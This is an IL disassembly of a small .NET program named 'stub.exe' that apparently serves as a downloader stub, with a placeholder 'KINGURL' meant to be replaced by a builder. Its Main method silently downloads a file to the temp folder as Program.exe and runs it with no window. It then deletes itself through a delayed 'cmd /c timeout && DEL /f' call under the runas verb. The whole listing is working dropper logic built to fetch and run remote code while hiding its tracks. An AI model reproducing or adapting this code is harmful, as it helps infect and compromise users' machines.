
//  Microsoft (R) .NET Framework IL Disassembler.  Version 4.8.3928.0




// Metadata version: v4.0.30319
.assembly extern mscorlib
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 4:0:0:0
}
.assembly extern System
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 4:0:0:0
}
.assembly stub
{
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilationRelaxationsAttribute::.ctor(int32) = ( 01 00 08 00 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.CompilerServices.RuntimeCompatibilityAttribute::.ctor() = ( 01 00 01 00 54 02 16 57 72 61 70 4E 6F 6E 45 78   // ....T..WrapNonEx
                                                                                                             63 65 70 74 69 6F 6E 54 68 72 6F 77 73 01 )       // ceptionThrows.

  // --- Следующий настраиваемый атрибут добавлен автоматически, не следует отменять преобразование в комментарий -------
  //  .custom instance void [mscorlib]System.Diagnostics.DebuggableAttribute::.ctor(valuetype [mscorlib]System.Diagnostics.DebuggableAttribute/DebuggingModes) = ( 01 00 02 00 00 00 00 00 ) 

  .custom instance void [mscorlib]System.Reflection.AssemblyTitleAttribute::.ctor(string) = ( 01 00 0D 53 69 6D 70 6C 79 50 72 6F 67 72 61 6D   // ...SimplyProgram
                                                                                              00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyDescriptionAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyConfigurationAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyCompanyAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyProductAttribute::.ctor(string) = ( 01 00 0D 53 69 6D 70 6C 79 50 72 6F 67 72 61 6D   // ...SimplyProgram
                                                                                                00 00 ) 
  .custom instance void [mscorlib]System.Reflection.AssemblyCopyrightAttribute::.ctor(string) = ( 01 00 19 43 6F 70 79 72 69 67 68 74 20 C2 A9 54   // ...Copyright ..T
                                                                                                  65 73 74 65 72 73 20 20 32 30 32 34 00 00 )       // esters  2024..
  .custom instance void [mscorlib]System.Reflection.AssemblyTrademarkAttribute::.ctor(string) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.InteropServices.ComVisibleAttribute::.ctor(bool) = ( 01 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.InteropServices.GuidAttribute::.ctor(string) = ( 01 00 24 63 61 38 61 37 30 64 37 2D 39 38 32 39   // ..$ca8a70d7-9829
                                                                                                  2D 34 35 31 61 2D 61 35 32 37 2D 39 33 65 33 32   // -451a-a527-93e32
                                                                                                  64 34 39 64 31 34 32 00 00 )                      // d49d142..
  .custom instance void [mscorlib]System.Reflection.AssemblyFileVersionAttribute::.ctor(string) = ( 01 00 07 31 2E 30 2E 30 2E 30 00 00 )             // ...1.0.0.0..
  .custom instance void [mscorlib]System.Runtime.Versioning.TargetFrameworkAttribute::.ctor(string) = ( 01 00 1C 2E 4E 45 54 46 72 61 6D 65 77 6F 72 6B   // ....NETFramework
                                                                                                        2C 56 65 72 73 69 6F 6E 3D 76 34 2E 37 2E 32 01   // ,Version=v4.7.2.
                                                                                                        00 54 0E 14 46 72 61 6D 65 77 6F 72 6B 44 69 73   // .T..FrameworkDis
                                                                                                        70 6C 61 79 4E 61 6D 65 14 2E 4E 45 54 20 46 72   // playName..NET Fr
                                                                                                        61 6D 65 77 6F 72 6B 20 34 2E 37 2E 32 )          // amework 4.7.2
  .hash algorithm 0x00008004
  .ver 1:0:0:0
}
.module stub.exe
// MVID: {034AFFDD-99FA-4838-A18A-C9BBEEBE6FC0}
.imagebase 0x00400000
.file alignment 0x00000200
.stackreserve 0x00100000
.subsystem 0x0002       // WINDOWS_GUI
.corflags 0x00020003    //  ILONLY 32BITPREFERRED
// Image base: 0x070E0000


// =============== CLASS MEMBERS DECLARATION ===================

.class private auto ansi beforefieldinit SimplyProgram.Program
       extends [mscorlib]System.Object
{
  .method private hidebysig static void  Main(string[] args) cil managed
  {
    .entrypoint
    // Размер кода:       116 (0x74)
    .maxstack  3
    .locals init (string V_0,
             string V_1,
             string V_2,
             class [System]System.Net.WebClient V_3)
    IL_0000:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
    IL_0005:  callvirt   instance class [System]System.Diagnostics.ProcessModule [System]System.Diagnostics.Process::get_MainModule()
    IL_000a:  callvirt   instance string [System]System.Diagnostics.ProcessModule::get_FileName()
    IL_000f:  stloc.0
    IL_0010:  ldstr      "KINGURL"
    IL_0015:  stloc.1
    IL_0016:  call       string [mscorlib]System.IO.Path::GetTempPath()
    IL_001b:  ldstr      "Program.exe"
    IL_0020:  call       string [mscorlib]System.IO.Path::Combine(string,
                                                                  string)
    IL_0025:  stloc.2
    .try
    {
      IL_0026:  newobj     instance void [System]System.Net.WebClient::.ctor()
      IL_002b:  stloc.3
      .try
      {
        IL_002c:  ldloc.3
        IL_002d:  ldloc.1
        IL_002e:  ldloc.2
        IL_002f:  callvirt   instance void [System]System.Net.WebClient::DownloadFile(string,
                                                                                      string)
        IL_0034:  newobj     instance void [System]System.Diagnostics.ProcessStartInfo::.ctor()
        IL_0039:  dup
        IL_003a:  ldloc.2
        IL_003b:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_FileName(string)
        IL_0040:  dup
        IL_0041:  ldc.i4.1
        IL_0042:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_CreateNoWindow(bool)
        IL_0047:  dup
        IL_0048:  ldc.i4.1
        IL_0049:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_WindowStyle(valuetype [System]System.Diagnostics.ProcessWindowStyle)
        IL_004e:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(class [System]System.Diagnostics.ProcessStartInfo)
        IL_0053:  pop
        IL_0054:  ldloc.0
        IL_0055:  ldc.i4.1
        IL_0056:  call       void SimplyProgram.Program::DelayDeleteFile(string,
                                                                         int32)
        IL_005b:  leave.s    IL_0067

      }  // end .try
      finally
      {
        IL_005d:  ldloc.3
        IL_005e:  brfalse.s  IL_0066

        IL_0060:  ldloc.3
        IL_0061:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
        IL_0066:  endfinally
      }  // end handler
      IL_0067:  leave.s    IL_0073

    }  // end .try
    catch [mscorlib]System.Object 
    {
      IL_0069:  pop
      IL_006a:  ldloc.0
      IL_006b:  ldc.i4.1
      IL_006c:  call       void SimplyProgram.Program::DelayDeleteFile(string,
                                                                       int32)
      IL_0071:  leave.s    IL_0073

    }  // end handler
    IL_0073:  ret
  } // end of method Program::Main

  .method private hidebysig static void  DelayDeleteFile(string fileName,
                                                         [opt] int32 delaySecond) cil managed
  {
    .param [2] = int32(0x00000002)
    // Размер кода:       102 (0x66)
    .maxstack  3
    .locals init (string V_0,
             string V_1,
             string V_2)
    IL_0000:  ldarg.0
    IL_0001:  call       string [mscorlib]System.IO.Path::GetFullPath(string)
    IL_0006:  starg.s    fileName
    IL_0008:  ldarg.0
    IL_0009:  call       string [mscorlib]System.IO.Path::GetDirectoryName(string)
    IL_000e:  stloc.0
    IL_000f:  ldarg.0
    IL_0010:  call       string [mscorlib]System.IO.Path::GetFileName(string)
    IL_0015:  stloc.1
    IL_0016:  ldstr      "/c timeout /t {0} && DEL /f {1} "
    IL_001b:  ldarg.1
    IL_001c:  box        [mscorlib]System.Int32
    IL_0021:  ldloc.1
    IL_0022:  call       string [mscorlib]System.String::Format(string,
                                                                object,
                                                                object)
    IL_0027:  stloc.2
    IL_0028:  newobj     instance void [System]System.Diagnostics.ProcessStartInfo::.ctor()
    IL_002d:  dup
    IL_002e:  ldstr      "runas"
    IL_0033:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_Verb(string)
    IL_0038:  dup
    IL_0039:  ldstr      "cmd"
    IL_003e:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_FileName(string)
    IL_0043:  dup
    IL_0044:  ldc.i4.0
    IL_0045:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_UseShellExecute(bool)
    IL_004a:  dup
    IL_004b:  ldc.i4.1
    IL_004c:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_CreateNoWindow(bool)
    IL_0051:  dup
    IL_0052:  ldloc.2
    IL_0053:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_Arguments(string)
    IL_0058:  dup
    IL_0059:  ldloc.0
    IL_005a:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_WorkingDirectory(string)
    IL_005f:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(class [System]System.Diagnostics.ProcessStartInfo)
    IL_0064:  pop
    IL_0065:  ret
  } // end of method Program::DelayDeleteFile

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Размер кода:       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method Program::.ctor

} // end of class SimplyProgram.Program


// =============================================================

// *********** ДИЗАССЕМБЛИРОВАНИЕ ЗАВЕРШЕНО ***********************
// ВНИМАНИЕ: создан файл ресурсов Win32 stub.res
